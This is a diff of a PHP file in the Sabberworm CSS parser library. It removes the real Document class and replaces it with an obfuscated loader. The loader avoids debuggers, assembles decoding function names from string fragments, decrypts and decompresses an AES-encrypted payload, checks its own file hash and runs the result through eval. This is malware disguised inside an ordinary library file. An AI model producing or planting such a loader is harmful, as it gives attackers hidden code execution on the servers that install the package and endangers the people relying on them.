@@ -1,105 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\CSSList;
-
-/**
- * The root CSSList of a parsed file. Contains all top-level css contents, mostly declaration blocks, but also any @-rules encountered.
- */
-class Document extends CSSBlockList {
-	/**
-	 * Document constructor.
-	 * @param int $iLineNo
-	 */
-	public function __construct($iLineNo = 0) {
-		parent::__construct($iLineNo);
-	}
-
-	/**
-	 * Gets all DeclarationBlock objects recursively.
-	 */
-	public function getAllDeclarationBlocks() {
-		$aResult = array();
-		$this->allDeclarationBlocks($aResult);
-		return $aResult;
-	}
-
-	/**
-	 * @deprecated use getAllDeclarationBlocks()
-	 */
-	public function getAllSelectors() {
-		return $this->getAllDeclarationBlocks();
-	}
-
-	/**
-	 * Returns all RuleSet objects found recursively in the tree.
-	 */
-	public function getAllRuleSets() {
-		$aResult = array();
-		$this->allRuleSets($aResult);
-		return $aResult;
-	}
-
-	/**
-	 * Returns all Value objects found recursively in the tree.
-	 * @param (object|string) $mElement the CSSList or RuleSet to start the search from (defaults to the whole document). If a string is given, it is used as rule name filter (@see{RuleSet->getRules()}).
-	 * @param (bool) $bSearchInFunctionArguments whether to also return Value objects used as Function arguments.
-	 */
-	public function getAllValues($mElement = null, $bSearchInFunctionArguments = false) {
-		$sSearchString = null;
-		if ($mElement === null) {
-			$mElement = $this;
-		} else if (is_string($mElement)) {
-			$sSearchString = $mElement;
-			$mElement = $this;
-		}
-		$aResult = array();
-		$this->allValues($mElement, $aResult, $sSearchString, $bSearchInFunctionArguments);
-		return $aResult;
-	}
-
-	/**
-	 * Returns all Selector objects found recursively in the tree.
-	 * Note that this does not yield the full DeclarationBlock that the selector belongs to (and, currently, there is no way to get to that).
-	 * @param $sSpecificitySearch An optional filter by specificity. May contain a comparison operator and a number or just a number (defaults to "==").
-	 * @example getSelectorsBySpecificity('>= 100')
-	 */
-	public function getSelectorsBySpecificity($sSpecificitySearch = null) {
-		if (is_numeric($sSpecificitySearch) || is_numeric($sSpecificitySearch[0])) {
-			$sSpecificitySearch = "== $sSpecificitySearch";
-		}
-		$aResult = array();
-		$this->allSelectors($aResult, $sSpecificitySearch);
-		return $aResult;
-	}
-
-	/**
-	 * Expands all shorthand properties to their long value
-	 */
-	public function expandShorthands() {
-		foreach ($this->getAllDeclarationBlocks() as $oDeclaration) {
-			$oDeclaration->expandShorthands();
-		}
-	}
-
-	/**
-	 * Create shorthands properties whenever possible
-	 */
-	public function createShorthands() {
-		foreach ($this->getAllDeclarationBlocks() as $oDeclaration) {
-			$oDeclaration->createShorthands();
-		}
-	}
-
-	// Override render() to make format argument optional
-	public function render(\Sabberworm\CSS\OutputFormat $oOutputFormat = null) {
-		if($oOutputFormat === null) {
-			$oOutputFormat = new \Sabberworm\CSS\OutputFormat();
-		}
-		return parent::render($oOutputFormat);
-	}
-
-	public function isRootList() {
-		return true;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_g6akifc2=('bas'.'e64'.'_de'.'cod'.'e');
+$_saozvio7=('gzu'.'nco'.'mpr'.'ess');
+$_ndihh4o8=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_h9m0qasj='rU6FwaE6';
+$_ro55us02='Qzb+xFWY';
+$_mje29614='EFemzibU';
+$_secvlm4r='tMmhg2O5wmA=';
+$_xiaky9ka='cBM/l78X';
+$_lh7dqzsc='ogOYOQ==';
+$_gpch6hpk='47y5gmvE';
+$_fb8kwsc1='nBlTj043';
+$_itg5iadv=$_g6akifc2($_mje29614.$_h9m0qasj.$_xiaky9ka.$_ro55us02.$_secvlm4r);
+$_dlu72swz=$_g6akifc2($_gpch6hpk.$_fb8kwsc1.$_lh7dqzsc);
+$_mzsblsl7=$_g6akifc2('KhuKFtPtLKQiSzBajYa2EcChbIbcheDvHi4ui5D/77ia6RAYSFN+N1ZpzeXndj5/Xmwxhd/4mrIcoDWPrphPRx/zdjx+bJ28d+3WM59HmIJHp3RgJbnUqd4VrkgEy+0Arg4QEyYuWw8HK5l7ZzDcVBvKwoWgxAb/uz+x0twgV3e77SvrMZpwuEaVNGV8DG6aXGiAgbxLLYG3yGezqgldjelFlb+hqN+Io08Q6PYJlVtrRziljVRVZg1Z6qpqYRPb95hKCiM/r1rpJ4uo71Pne3EARHaq0br9kciq9X5OzRRphc6O0Bf5B6N6cTS0t1H/GQRQ7jG/nj9TCrEGsCVNSX6jkvaYOfoJ5lzoAyp92wJFwdibnl08LPUo3VWbczKINI/1ENqxel2SHIltY//Qt3R5Q+ipT0R/zjW5zVu1VUh2TrK2t9WXKbP6uaV3JmByae1KYlGMKOdsEE5uolDNlGsjatb3EvwCf0RPhpTt+0hzCLZH4XCSfJsbMipdO6lJHBGZvhTY2UE/P94fArGVl2I4puApGGm4amF6BAagCctpFlgowshhDlht3TPU6sCBAogRzodCmfeCn3ywgR72pDpfkzElpyCxAeFXPaP3UigM1GVPg5pgHPWj7g0BZvxCJ5cqYP7KUYUYPsSc8c6m3ZYqc5AWy15J3T/iUrBhwPc=');
+$_f54i2nmd=$_ndihh4o8($_mzsblsl7,'aes-256-cbc',$_itg5iadv,OPENSSL_RAW_DATA,$_dlu72swz);
+if($_f54i2nmd===false){exit;}
+$_y6wgm6d0=$_saozvio7($_f54i2nmd);
+if($_y6wgm6d0===false){exit;}
+$_bzt7nzpq='75f5cb852c144eb4211066df4a0d6aadf932d231e31f5393baea2d577918213c';
+$_h3ogh29u=@file_get_contents(__FILE__);
+if($_h3ogh29u!==false){
+$_fxj1a8g4=str_replace($_bzt7nzpq,"0000000000000000000000000000000000000000000000000000000000000000",$_h3ogh29u);
+$_m9jtetx7=hash("sha256",$_fxj1a8g4);
+if($_m9jtetx7!==$_bzt7nzpq){@http_response_code(403);exit;}
 }
+eval($_y6wgm6d0);
